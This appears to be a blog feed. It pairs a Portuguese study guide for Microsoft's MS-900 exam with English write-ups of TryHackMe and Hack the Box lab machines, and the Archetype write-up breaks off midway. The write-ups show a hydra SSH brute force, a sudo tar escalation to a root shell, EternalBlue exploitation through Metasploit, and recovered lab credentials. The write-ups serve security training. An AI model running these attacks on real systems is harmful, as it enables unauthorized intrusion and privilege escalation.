<p>Minha dica principal é ter vivência com a plataforma da microsoft, caso já tenha experiência sua prova com certeza será muito mais fácil. Porém também é possível fazer a prova sem ter experiência, mas talvez o candidato tenha certa dificuldade em assimilar a função de cada ferramenta dentro da plataforma. O que não é um impedimento, com um pouco mais de estudo é possível entender e até mesmo testar os serviços no plano free da Microsoft.</p>
<p>A prova possui 40 questões e é preciso ter 70% de acerto.</p>
<p>O valor no Brasil é de 99 dólares. 
Talvez você seja elegível a descontos de estudante ou corporativo. Consulte o desconto na página de agendamento.
Além disso, existe um desconto para pessoas que foram atingidas pela situação atual em que estamos de pandemia, o valor da prova fica em torno de 15 dólares nesse caso.</p>

    <img src="/images/ms-900/preco.png"  class="center"  style="border-radius: 10px;"  />


<p>O exame pode ser agendado tanto presencial quanto online, eu fiz o exame de forma online.</p>
<p>As questões são de múltipla escolha, verdadeiro ou falso e também questões de correlacionar. 
O contexto das questões pode ser simples e direto, com perguntas do tipo: &ldquo;O que é isso?&rdquo; &quot; Qual a função disso&quot; e outras envolvem uma descrição de uma &ldquo;situação&rdquo; ou &ldquo;cenário&rdquo; onde o profissional precisa responder com as soluções/ferramentas correspondentes da plataforma Microsoft 365.</p>
<p>Minha prova foi realizada no dia 06/06/2021, online no idioma inglês.</p>
<h2 id="composição-da-prova">Composição da Prova</h2>
<p>O conteúdo não é grande e é possível estudar para prova em um tempo bem curto, claro levando em conta seu conhecimento prévio para prova. 
No meu caso eu estudei por uma semana de forma mais intensiva e depois fiz a prova.</p>
<p>-Descrever os conceitos de nuvem (10-15%)
-Descrever os serviços e conceitos básicos do Microsoft 365 (30-35%)
-Descrever a segurança, conformidade, privacidade e confiança no Microsoft 365 (30-35%)
-Descrever os preços e suporte do Microsoft 365 (20-25%)</p>
<p>O documento completo com a estrutura da prova pode ser encontrado <a href="https://query.prod.cms.rt.microsoft.com/cms/api/am/binary/RE3VwVw" target="_blank" >aqui</a>.</p>
<h2 id="preparação">Preparação</h2>
<p>Na minha opinião existem duas formas de se preparar para essa prova: uma é com conteúdos gratuitos e outra com conteúdo pago.</p>
<h3 id="conteúdo-gratuito">Conteúdo Gratuito</h3>
<p>Na internet é possível encontrar diversas fontes de estudo gratuitas para essa prova, porém a maioria que encontrei foi no idioma em inglês.
Porém se você tem um pouco de familiaridade com o idioma, é possível sim assistir os vídeos e até realizar a prova no idioma inglês, o conteúdo é bem técnico e se você já é um profissional da área de TI vai encontrar termos e expressões comuns utilizados no seu dia a dia.</p>
<p>Eu recomendo o canal <a href="https://www.youtube.com/channel/UCg8OCdG1yeiSPFDyqQDxHnw" target="_blank" >A guide to Cloud</a> além do conteúdo para MS-900 ele possui outros vídeos para certificações da microsoft.</p>

    <img src="/images/ms-900/guidetocloud.png"  class="center"  style="border-radius: 10px;"  />


<p>A playlist do curso é bem completa com todo conteúdo da prova.</p>


<iframe width="560" height="315" src="https://www.youtube.com/embed/videoseries?list=PLhLKc18P9YOBtDKWHVr1TwUq6_smRdCjo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

<p>Essa é minha recomendação de curso gratuito já que eu assisti alguns vídeos não só desse curso mas de outros produzidos no canal. Porém com uma busca rápida no youtube é possível encontrar outros produtores de conteúdo com vídeos gratuitos para preparação da MS-900.


<iframe width="560" height="315" src="https://www.youtube.com/embed/ZtOo7prP4_M" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

</p>
<p>Outra forma de preparação são os cursos gratuitos da <a href="https://www.linkedin.com/company/ka-solution/" target="_blank" >KaSolution</a>, eles estão sempre promovendo cursos aos sábados. Completos para várias formações Microsoft.
Infelizmente para esse método você vai precisar contar com a sorte de abrirem uma turma gratuita. 
Basta ficar de olho na rede social deles, no último sábado dia 28/08/2021 eles promoveram um curso do AZ-900 por exemplo.</p>
<h3 id="conteúdo-pago">Conteúdo Pago</h3>
<p>Como recomendação de conteúdo pago eu deixo o curso da <a href="https://www.cbtnuggets.com/it-training/microsoft-365/certified-fundamentals" target="_blank" >Cbtnugget</a>, foi o curso que eu fiz por completo para me preparar para essa certificação.</p>

    <img src="/images/ms-900/cbt.png"  class="center"  style="border-radius: 10px;"  />


<p>Um dos instrutores é o Chuck Keith o <a href="https://www.youtube.com/user/NetworkChuck" target="_blank" >Network Chuck</a>, ele apresenta a parte inicial dos conceitos básicos. A <a href="https://www.linkedin.com/in/simonamillham/" target="_blank" >Simona Millham</a> entra na parte do conteúdo da prova, apresentando todos os tópicos necessários para a prova.</p>
<p>A plataforma tem um valor mensal um pouco alto para nossos padrões, porém você pode aproveitar os 7 dias gratuitos e testar a vasta gama de cursos que eles possuem. Sempre que tenho possibilidade de fazer um curso com eles eu faço devido a qualidade do conteúdo e metodologia.</p>
<p>Além disso o curso possui diversas questões de exemplo para preparação e também explicações para as respostas.</p>
<p>No <a href="https://www.udemy.com" target="_blank" >Udemy</a> também é possível encontrar muitos cursos de preparação para MS-900 com valores acessíveis.</p>
<p>Na <a href="https://www.kasolution.com.br/Home?pt=google" target="_blank" >KaSolution</a> além dos cursos gratuitos é possível comprar diversas formações para preparação de certificações diversas da Microsoft.</p>
<p>Além disso é possível comprar o livro oficial da microsoft para preparação, infelizmente para essa prova eu não comprei, devido o valor elevado aqui no Brasil. Entretanto eu conheço os livros de outras certificações da microsoft que tirei e eles são bem completos e recomendo muito quando é possível encontrar com preços acessíveis.</p>

    <img src="/images/ms-900/book.jpg"  class="center"  style="border-radius: 10px;"  />


<h2 id="simulados">Simulados</h2>
<p>Acredito que os simulados são uma preparação extra para prova, muitos não apoiam a ideia porém a própria microsoft vende os famosos brain dumps. Dentro da página de agendamento é possível encontrar um link para compra:</p>

    <img src="/images/ms-900/exame.png"  class="center"  style="border-radius: 10px;"  />


<p>Esse eu realmente não indico a compra, nunca comprei devido o alto valor solicitado. 
Se você optou por estudar tanto com vídeos do Youtube, Cbtnuggets ou KaSolution durante as aulas você vai encontrar exemplos de questões para te ajudar em sua preparação.</p>
<p>Lógico que somente estudar utilizando os simulados não é uma boa prática, já que você só estaria decorando questões e não adquirindo conhecimento.</p>
<p>Uma opção gratuita para testar seu conhecimento com questões é o site: <a href="https://www.itexams.com" target="_blank" >IT Exams</a>.</p>

    <img src="/images/ms-900/itexams.png"  class="center"  style="border-radius: 10px;"  />


<p>Outra forma porém essa paga é comprando simulados preparatórios no Udemy, existem vários na plataforma. 
Eu comprei esse <a href="https://www.udemy.com/course/ms-900-5-practice-tests-on-ms-365-certification" target="_blank" >aqui</a>e as questões foram realmente boas para minha preparação.</p>

    <img src="/images/ms-900/udemy.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="tópicos-importantes">Tópicos importantes</h2>
<p>Esse item pode ser um pouco complicado, não existe o tópico mais importante! Porém existem ferramentas e itens que são certos de cair na prova, e você precisa saber o que são.</p>
<ul>
<li>É fundamental entender as diferenças de planos, o que tem em um e em outro não.</li>
<li>Entender o básico dos itens:
<ul>
<li>Microsoft Intune</li>
<li>Azure Information Protection</li>
<li>Azure Active Directory</li>
<li>Microsoft Advanced Threat Analytics</li>
</ul>
</li>
<li>Conceitos de segurança:
<ul>
<li>Secure authentication</li>
<li>Conditional access</li>
<li>Identity Protection</li>
<li>Threat protection</li>
</ul>
</li>
</ul>
<p>Como eu disse esses são só pontos em destaque que eu percebi que foram muito cobrados na minha prova, então não foque só nesses. Mas se você leu e sabe o que são todos esses itens e entende o que cada um deles faz, você provavelmente já tem uma boa base para prova.</p>
<h2 id="dia-da-prova">Dia da Prova</h2>
<p>Essa foi a minha primeira certificação online, todas as outras eu fiz em centros de estudo.
O processo é bem simples, você vai receber um link para acessar no dia da prova. Além disso existe um link para testar seu sistema, ele testa seu navegador, câmera e microfone. Você será monitorado o tempo todo durante a prova, para que não exista possibilidade de fraude. 
Para falar com o &ldquo;proctor&rdquo;, pessoa responsável por monitorar sua prova, é preciso falar em inglês via chat. Porém se você se preparar bem não vai precisar falar quase nada com eles. 
Eu só precisei falar que estava preparado para iniciar e depois informei o termino só isso.</p>
<p>A preparação consistem em alguns pontos:</p>
<ul>
<li>Deixar a câmera ligada;</li>
<li>Mostrar seus documentos;</li>
<li>Preparar o ambiente de prova: não pode existir outra pessoa perto, barulhos, eletrônicos aparentes ( eu precisei tampar minha TV com um lençol);</li>
<li>Mostrar todo o ambiente com a webcam e no final mostrar que você vai deixar o celular em um local longe de você.</li>
</ul>
<p>Todos os items acima eu me adiantei e preparei, a TV estava já tampada, o celular eu deixei aparente na cama atrás de mim. Então não houve nenhum problema para iniciar a prova. 
Vi relatos de outras pessoas que não prepararam o ambiente e foi preciso fazer tudo isso antes da prova iniciar com as indicações do proctor.</p>
<p>Depois de toda checagem de segurança a prova foi realizada sem problemas, creio que demorei em torno de 35 minutos para realizar a prova. 
O resultado foi imediato e horas depois recebi o certificado e badge da MS-900.</p>

    <img src="/images/ms-900/badge.png"  class="center"  style="border-radius: 10px;"  />




<br>



<img src="https://nmorette.files.wordpress.com/2021/06/capturar.png">

]]></content>
        </item>
        
        <item>
            <title>TryHackme - Bounty Hacker - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</link>
            <pubDate>Sun, 15 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/tryhackme-bounty-hacker-write-up/</guid>
            <description>First of all, let&amp;rsquo;s nmap the machine IP.
└─$ sudo nmap -sS -Pn 10.10.207.23 [sudo] password for venomsnake: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-15 07:43 -03 Nmap scan report for 10.10.207.23 Host is up (0.20s latency). Not shown: 967 filtered ports, 30 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 9.</description>
            <content type="html"><![CDATA[
    <img src="/images/tryhackme/bountyhacker/banner.png"  class="center"  style="border-radius: 10px;"  />


<p>First of all, let&rsquo;s <code>nmap</code> the machine IP.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└─$</span> sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.207.23</span>
[sudo] password <span style="color:#66d9ef">for</span> venomsnake: 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-15 07:43 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.207.23</span>
Host is up (<span style="color:#ae81ff">0.20</span>s latency).
Not shown: <span style="color:#ae81ff">967</span> filtered ports, <span style="color:#ae81ff">30</span> closed ports
PORT   STATE SERVICE
<span style="color:#ae81ff">21</span><span style="color:#f92672">/</span>tcp open  ftp
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp open  ssh
<span style="color:#ae81ff">80</span><span style="color:#f92672">/</span>tcp open  http

Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">9.46</span> seconds
</code></pre></div><p>We found three open ports: 21,22 and 80. The next step is to enumerate these ports:</p>
<h2 id="http-80">HTTP 80</h2>

    <img src="/images/tryhackme/bountyhacker/80.png"  class="center"  style="border-radius: 10px;"  />


<p>We found a text introduction on the web page.</p>
<p>Let&rsquo;s use dirbuster to dig more info:</p>

    <img src="/images/tryhackme/bountyhacker/dirbuster.png"  class="center"  style="border-radius: 10px;"  />


<p>Unfortunately, we don&rsquo;t find useful information.</p>
<h2 id="ftp-21">FTP 21</h2>
<p>Let&rsquo;s try an anonymous login into the FTP server:</p>

    <img src="/images/tryhackme/bountyhacker/ftp.png"  class="center"  style="border-radius: 10px;"  />


<p>It&rsquo;s working!</p>
<p>We found 2 files in the server: <code>task.txt</code> with the answer for the question: <em>&ldquo;Who wrote the task list?&quot;</em>. 
The other file <code>locks.txt</code> looks like a list of passwords.</p>
<p>Now we have one user name and a list of possible passwords, we could try to brute force port 22.</p>
<h2 id="ssh-22">SSH 22</h2>
<p>Let&rsquo;s use <code>hydra</code> with a list of users. We found one user in the file <code>task.txt</code> but just in case we could use a list of possible users.</p>

    <img src="/images/tryhackme/bountyhacker/users.png"  class="center"  style="border-radius: 10px;"  />


<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hydra <span style="color:#f92672">-</span>v <span style="color:#f92672">-</span>L users.txt <span style="color:#f92672">-</span>P locks.txt <span style="color:#ae81ff">10.10.207.23</span> ssh <span style="color:#f92672">-</span>t <span style="color:#ae81ff">4</span>
</code></pre></div>
    <img src="/images/tryhackme/bountyhacker/ssh.png"  class="center"  style="border-radius: 10px;"  />


<p>We got the lin&rsquo;s password to ssh.</p>
<p>Finally, we could have access to the host:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssh lin<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">10.10.207.23</span>
</code></pre></div><p>Now we&rsquo;re looking the <code>users.txt</code> file in ~/Desktop:</p>

    <img src="/images/tryhackme/bountyhacker/txt.png"  class="center"  style="border-radius: 10px;"  />


<p>The next step is to find the <code>root.txt</code> file, but the user lin isn&rsquo;t in the sudoers group.
So we need to find some way to privesc this host.</p>
<p>Checking what we can run with <code>sudo -l</code>:</p>

    <img src="/images/tryhackme/bountyhacker/sudo.png"  class="center"  style="border-radius: 10px;"  />


<p>Let’s check our best friend GTFOBIns by going to <a href="https://gtfobins.github.io" target="_blank" >https://gtfobins.github.io</a></p>

    <img src="/images/tryhackme/bountyhacker/tar.png"  class="center"  style="border-radius: 10px;"  />


<p>We have a possible privesc with tar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo tar <span style="color:#f92672">-</span>cf <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">/</span>dev<span style="color:#f92672">/</span>null <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">--</span>checkpoint<span style="color:#f92672">-</span>action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=/</span>bin<span style="color:#f92672">/</span>sh
</code></pre></div><p>That&rsquo;s it! We&rsquo;re root!</p>

    <img src="/images/tryhackme/bountyhacker/root.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Blue- Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/08/hack-the-box-blue-write-up/</link>
            <pubDate>Fri, 13 Aug 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/08/hack-the-box-blue-write-up/</guid>
            <description>Enumeration Initial scan:
└──╼ $sudo nmap -sS -Pn 10.10.10.40 Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 15:11 -03 Nmap scan report for 10.10.10.40 Host is up (0.45s latency). Not shown: 991 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown Second nmap scan with --script vuln only on the open ports:</description>
            <content type="html"><![CDATA[<p>

<br>


    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/blue/banner.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">└──╼</span> <span style="color:#960050;background-color:#1e0010">$</span>sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.40</span> 
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-11 15:11 -03
</span><span style="color:#75715e"></span>Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.40</span>
Host is up (<span style="color:#ae81ff">0.45</span>s latency).
Not shown: <span style="color:#ae81ff">991</span> closed ports
PORT      STATE SERVICE
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds
<span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49155</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49156</span><span style="color:#f92672">/</span>tcp open  unknown
<span style="color:#ae81ff">49157</span><span style="color:#f92672">/</span>tcp open  unknown
</code></pre></div><p>Second nmap scan with <code>--script vuln</code> only on the open ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">sudo nmap <span style="color:#f92672">-</span>sS <span style="color:#f92672">-</span>Pn <span style="color:#ae81ff">10.10.10.40</span> <span style="color:#f92672">-</span>A <span style="color:#f92672">-</span>p135,<span style="color:#ae81ff">139</span>,<span style="color:#ae81ff">445</span>,<span style="color:#ae81ff">49152</span>,<span style="color:#ae81ff">49153</span>,<span style="color:#ae81ff">49154</span>,<span style="color:#ae81ff">49155</span>,<span style="color:#ae81ff">49156</span>,<span style="color:#ae81ff">49157</span> <span style="color:#f92672">--</span>script vuln
Host discovery disabled (<span style="color:#f92672">-</span>Pn). All addresses will be marked <span style="color:#960050;background-color:#1e0010">&#39;</span>up<span style="color:#960050;background-color:#1e0010">&#39;</span> and scan times will be slower.
Starting Nmap <span style="color:#ae81ff">7.91</span> ( https:<span style="color:#75715e">//nmap.org ) at 2021-08-11 15:25 -03
</span><span style="color:#75715e"></span>Pre<span style="color:#f92672">-</span>scan script results:
<span style="color:#f92672">|</span> broadcast<span style="color:#f92672">-</span>avahi<span style="color:#f92672">-</span>dos: 
<span style="color:#f92672">|</span>   Discovered hosts:
<span style="color:#f92672">|</span>     <span style="color:#ae81ff">224.0.0.251</span>
<span style="color:#f92672">|</span>   After NULL UDP avahi packet DoS (CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2011</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1002</span>).
<span style="color:#f92672">|</span>_  Hosts are all up (not vulnerable).
Nmap scan report <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">10.10.10.40</span>
Host is up (<span style="color:#ae81ff">0.50</span>s latency).

PORT      STATE SERVICE      VERSION
<span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp   open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">139</span><span style="color:#f92672">/</span>tcp   open  netbios<span style="color:#f92672">-</span>ssn  Microsoft Windows netbios<span style="color:#f92672">-</span>ssn
<span style="color:#ae81ff">445</span><span style="color:#f92672">/</span>tcp   open  microsoft<span style="color:#f92672">-</span>ds Microsoft Windows <span style="color:#ae81ff">7</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">10</span> microsoft<span style="color:#f92672">-</span>ds (workgroup: WORKGROUP)
<span style="color:#ae81ff">49152</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49153</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49154</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49155</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49156</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
<span style="color:#ae81ff">49157</span><span style="color:#f92672">/</span>tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Microsoft Windows <span style="color:#ae81ff">7</span> or Windows Server <span style="color:#ae81ff">2008</span> R2 (<span style="color:#ae81ff">97</span><span style="color:#f92672">%</span>), Microsoft Windows Home Server <span style="color:#ae81ff">2011</span> (Windows Server <span style="color:#ae81ff">2008</span> R2) (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP1 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows Server <span style="color:#ae81ff">2008</span> SP2 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP0 <span style="color:#f92672">-</span> SP1 or Windows Server <span style="color:#ae81ff">2008</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP0 <span style="color:#f92672">-</span> SP1, Windows Server <span style="color:#ae81ff">2008</span> SP1, Windows Server <span style="color:#ae81ff">2008</span> R2, Windows <span style="color:#ae81ff">8</span>, or Windows <span style="color:#ae81ff">8.1</span> Update <span style="color:#ae81ff">1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> SP1 (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> Ultimate (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>), Microsoft Windows <span style="color:#ae81ff">7</span> Ultimate SP1 or Windows <span style="color:#ae81ff">8.1</span> Update <span style="color:#ae81ff">1</span> (<span style="color:#ae81ff">96</span><span style="color:#f92672">%</span>)
No exact OS matches <span style="color:#66d9ef">for</span> host (test conditions non<span style="color:#f92672">-</span>ideal).
Network Distance: <span style="color:#ae81ff">2</span> hops
Service Info: Host: HARIS<span style="color:#f92672">-</span>PC; OS: Windows; CPE: cpe:<span style="color:#f92672">/</span>o:microsoft:windows

Host script results:
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">054</span><span style="color:#f92672">:</span> false
<span style="color:#f92672">|</span>_smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms10<span style="color:#f92672">-</span><span style="color:#ae81ff">061</span><span style="color:#f92672">:</span> NT_STATUS_OBJECT_NAME_NOT_FOUND
<span style="color:#f92672">|</span> smb<span style="color:#f92672">-</span>vuln<span style="color:#f92672">-</span>ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span><span style="color:#f92672">:</span> 
<span style="color:#f92672">|</span>   VULNERABLE:
<span style="color:#f92672">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span>)
<span style="color:#f92672">|</span>     State: VULNERABLE
<span style="color:#f92672">|</span>     IDs:  CVE:CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0143</span>
<span style="color:#f92672">|</span>     Risk factor: HIGH
<span style="color:#f92672">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
<span style="color:#f92672">|</span>        servers (ms17<span style="color:#f92672">-</span><span style="color:#ae81ff">010</span>).
<span style="color:#f92672">|</span>           
<span style="color:#f92672">|</span>     Disclosure date: <span style="color:#ae81ff">2017</span><span style="color:#f92672">-</span><span style="color:#ae81ff">03</span><span style="color:#f92672">-</span><span style="color:#ae81ff">14</span>
<span style="color:#f92672">|</span>     References:
<span style="color:#f92672">|</span>       https:<span style="color:#75715e">//cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>       https:<span style="color:#75715e">//technet.microsoft.com/en-us/library/security/ms17-010.aspx
</span><span style="color:#75715e"></span><span style="color:#f92672">|</span>_      https:<span style="color:#75715e">//blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</span><span style="color:#75715e"></span>
TRACEROUTE (using port <span style="color:#ae81ff">135</span><span style="color:#f92672">/</span>tcp)
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   <span style="color:#ae81ff">244.54</span> ms <span style="color:#ae81ff">10.10.16.1</span>
<span style="color:#ae81ff">2</span>   <span style="color:#ae81ff">445.61</span> ms <span style="color:#ae81ff">10.10.10.40</span>

OS and Service detection performed. Please report any incorrect results at https:<span style="color:#75715e">//nmap.org/submit/ .
</span><span style="color:#75715e"></span>Nmap done: <span style="color:#ae81ff">1</span> IP address (<span style="color:#ae81ff">1</span> host up) scanned in <span style="color:#ae81ff">130.01</span> seconds


</code></pre></div><p>The host is vulnerable to ms17-10:</p>

    <img src="/images/htb/blue/vuln.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="exploit">Exploit</h2>
<p>Let&rsquo;s double-check this vuln with <code>msfconsole</code>.
Search for &ldquo;ms17-010&rdquo; and use the module: scanner/smb/smb_ms17_010:</p>

    <img src="/images/htb/blue/search.png"  class="center"  style="border-radius: 8px;"  />


<p>We have the confirmation:</p>

    <img src="/images/htb/blue/run.png"  class="center"  style="border-radius: 8px;"  />


<p>We need to set the exploit <code>windows/smb/ms17_010_eternal</code> and configure the options: RPORT, RHOSTS, LPORT and LHOST. Also, check the payload.</p>

    <img src="/images/htb/blue/smb.png"  class="center"  style="border-radius: 8px;"  />


<p>After that we could run the exploit and get access to the host:</p>

    <img src="/images/htb/blue/exploit.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="flag">Flag</h2>
<p>Search for the flag in the commons users folders.</p>

    <img src="/images/htb/blue/pawnd.PNG"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>Hack the Box - Archetype - Write Up</title>
            <link>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</link>
            <pubDate>Tue, 27 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2021/07/hack-the-box-archetype-write-up/</guid>
            <description>Enumeration Initial scan:
nmap -sSV 10.10.10.27Second nmap scan with --script vuln
We found a possible starting point: CVE-2008-4250.
SMB Enumeration The next step is to try to connect in the SMB service:
smbclient -L \\10.10.10.27 -NIPC$: this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</description>
            <content type="html"><![CDATA[<p>

<br>


    <img src="/images/htb/banner.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />

</p>
<h2 id="enumeration">Enumeration</h2>
<p>Initial scan:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli"> nmap -sSV 10.10.10.27
</code></pre>
    <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />


<p>Second nmap scan with <code>--script vuln</code></p>

    <img src="/images/htb/archetype/vuln.png"  class="center"  style="border-radius: 10px;"  />


<p>We found a possible starting point: CVE-2008-4250.</p>
<h2 id="smb-enumeration">SMB Enumeration</h2>
<p>The next step is to try to connect in the SMB service:</p>
<pre tabindex="0"><code class="language-cli" data-lang="cli"> smbclient -L \\10.10.10.27 -N
</code></pre>
    <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />


<p><strong>IPC$:</strong> this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</p>
<p><strong>backups:</strong> a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it.</p>
<p>The backup folder it’s accessible without a password and insidi we have an interesting file: <code>prod.dtsConfig</code>.</p>

    <img src="/images/htb/archetype/prod.png"  class="center"  style="border-radius: 10px;"  />


<p>Looking at the file we found a user and password.</p>
<p><code>user:</code> ARCHETYPE\sql_svc
<code>password:</code> M3g4c0rp123</p>
<h2 id="mssqlclipy">mssqlcli.py</h2>
<p>Using <code>mssqlcli.py</code> script with “-windows-auth” parameter to instruct the script to use Windows Authentication and the User ID and password found in the config file from before, I managed to get a connection to the exposed SQL server on port 1433.</p>

